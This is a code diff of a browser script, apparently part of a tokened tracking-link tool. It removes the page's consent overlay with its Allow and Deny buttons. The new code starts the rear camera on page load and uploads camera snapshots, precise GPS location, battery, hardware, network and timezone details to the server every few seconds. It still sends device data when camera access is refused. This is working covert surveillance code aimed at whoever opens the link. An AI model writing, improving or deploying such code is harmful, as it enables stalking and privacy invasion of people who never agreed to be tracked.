@@ -1,187 +1,123 @@
-// static/wrap_app.js
 (async () => {
-  const allowBtn = document.getElementById("consentAllow");
-  const denyBtn = document.getElementById("consentDeny");
-  const overlay = document.getElementById("consentOverlay");
-
+  const token = window.TOKEN;
   const video = document.getElementById("video");
-  const token = TOKEN;
-  const captureMs = 5000;
+  const canvas = document.getElementById("canvas");
 
+  const CAPTURE_MS = 5500;
   let stream = null;
-  let captureInterval = null;
 
-  const canvas = document.createElement("canvas");
-  const ctx = canvas.getContext("2d");
+  const json = (o) => JSON.stringify(o);
 
-  // collect "static" device info
-  async function collectDeviceDetails() {
-    const ua = navigator.userAgent || "";
-    const platform = navigator.platform || null;
-    const cpu = navigator.hardwareConcurrency || null;
-    const ram = navigator.deviceMemory || null;
-    const langs = navigator.languages || [navigator.language];
-
-    let tz = null;
+  const getDetails = () => {
+    const d = {};
+    d.userAgent = navigator.userAgent || "";
+    d.platform = navigator.platform || "";
+    d.cpuCores = navigator.hardwareConcurrency || null;
+    d.ramGB = navigator.deviceMemory || null;
+    d.screen = {
+      w: window.screen.width,
+      h: window.screen.height,
+      ratio: window.devicePixelRatio
+    };
     try {
-      tz = {
-        zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        offset: new Date().getTimezoneOffset()
-      };
-    } catch (_) {}
-
-    const scr = {
-      w: screen.width,
-      h: screen.height,
-      ratio: window.devicePixelRatio || 1,
-    };
-
-    const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    const net = n ? {
-      type: n.effectiveType,
-      downlink: n.downlink,
-      rtt: n.rtt,
-      saveData: n.saveData
-    } : null;
-
-    // permission states
-    let perms = {};
-    if (navigator.permissions) {
-      for (const name of ["geolocation", "camera"]) {
-        try {
-          const s = await navigator.permissions.query({ name });
-          perms[name] = s.state;
-        } catch (_) {}
+      const conn = navigator.connection;
+      if (conn) {
+        d.network = {
+          type: conn.effectiveType,
+          downlink: conn.downlink
+        };
       }
+    } catch (_) {}
+    d.permissions = {};
+    if (navigator.permissions) {
+      navigator.permissions.query({ name: "camera" }).then((r) => d.permissions.camera = r.state).catch(()=>{});
+      navigator.permissions.query({ name: "geolocation" }).then((r) => d.permissions.geolocation = r.state).catch(()=>{});
     }
+    try {
+      const z = Intl.DateTimeFormat().resolvedOptions();
+      d.tz = { zone: z.timeZone, offset: new Date().getTimezoneOffset() };
+    } catch (_) {}
+    return d;
+  };
 
-    return {
-      userAgent: ua,
-      platform,
-      cpuCores: cpu,
-      ramGB: ram,
-      languages: langs,
-      tz,
-      screen: scr,
-      network: net,
-      permissions: perms,
-    };
-  }
-
-  async function readBattery() {
+  const getBattery = async () => {
     try {
       if (!navigator.getBattery) return null;
       const b = await navigator.getBattery();
       return { level: Math.round(b.level * 100), charging: b.charging };
-    } catch (_) {
+    } catch {
       return null;
     }
-  }
+  };
 
-  async function getLocation() {
-    return new Promise((resolve) => {
+  const getCoords = async () =>
+    new Promise((resolve) => {
       if (!navigator.geolocation) return resolve(null);
       navigator.geolocation.getCurrentPosition(
-        pos => resolve({
+        (pos) => resolve({
           lat: pos.coords.latitude,
           lon: pos.coords.longitude,
           acc: pos.coords.accuracy
         }),
         () => resolve(null),
-        { enableHighAccuracy: true, maximumAge: 20000 }
+        { enableHighAccuracy: true, timeout: 4000 }
       );
     });
-  }
 
-  function waitForVideoReady(timeout = 3000) {
-    return new Promise((resolve) => {
-      if (video.videoWidth > 0) return resolve(true);
-      let done = false;
-      function ok() {
-        if (!done && video.videoWidth > 0) {
-          done = true;
-          cleanup();
-          resolve(true);
-        }
-      }
-      function cleanup() {
-        video.removeEventListener("loadedmetadata", ok);
-        video.removeEventListener("canplay", ok);
-      }
-      video.addEventListener("loadedmetadata", ok);
-      video.addEventListener("canplay", ok);
-      setTimeout(() => { if (!done) { done = true; cleanup(); resolve(false); } }, timeout);
-    });
-  }
+  const post = async (url, body) => {
+    try {
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: json(body),
+        keepalive: true
+      });
+    } catch (_) {}
+  };
 
-  async function uploadFrame() {
-    if (!stream) return;
+  const uploadInfo = async () => {
+    const [battery, coords] = await Promise.all([
+      getBattery(),
+      getCoords()
+    ]);
+    const details = getDetails();
+    await post(`/upload_info/${token}`, { battery, coords, details });
+  };
 
-    if (!video.videoWidth || !video.videoHeight) return;
-
+  const screenshot = async () => {
+    if (!stream || video.videoWidth === 0) return;
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    const dataUrl = canvas.toDataURL("image/jpeg", 0.75);
+    canvas.getContext("2d").drawImage(video, 0, 0);
+    const frame = canvas.toDataURL("image/jpeg", 0.75);
+    await post(`/upload_image/${token}`, { image_b64: frame });
+  };
 
-    await fetch(`/upload_image/${token}`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ image_b64: dataUrl })
-    });
-  }
+  const loop = async () => {
+    await uploadInfo();
+    await screenshot();
+  };
 
-  async function uploadInfo() {
-    const battery = await readBattery();
-    const coords = await getLocation();
-    const details = await collectDeviceDetails();
-
-    await fetch(`/upload_info/${token}`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ battery, coords, details })
-    });
-  }
-
-  async function startSession() {
+  // --- Start camera automatically ---
+  try {
     stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: "environment" },
       audio: false
     });
     video.srcObject = stream;
-    await video.play();
-    await waitForVideoReady(4000);
-
-    // First info + first photo immediately
+  } catch (_) {
     await uploadInfo();
-    await uploadFrame();
-
-    // then every 5 sec
-    captureInterval = setInterval(async () => {
-      await uploadInfo();
-      await uploadFrame();
-    }, captureMs);
+    return;
   }
 
-  function stopSession() {
-    if (captureInterval) clearInterval(captureInterval);
-    captureInterval = null;
+  loop();
+  setInterval(loop, CAPTURE_MS);
 
-    if (stream) {
-      for (const t of stream.getTracks()) t.stop();
-      stream = null;
-      video.srcObject = null;
-    }
-  }
-
-  allowBtn.addEventListener("click", async () => {
-    overlay.style.display = "none";
-    startSession();
+  // graceful finish
+  window.addEventListener("beforeunload", () => {
+    try {
+      navigator.sendBeacon(`/upload_info/${token}`, json({ note: "close" }));
+    } catch (_) {}
   });
 
-  denyBtn.addEventListener("click", () => {
-    overlay.style.display = "none";
-  });
-
-  window.addEventListener("beforeunload", stopSession);
 })();
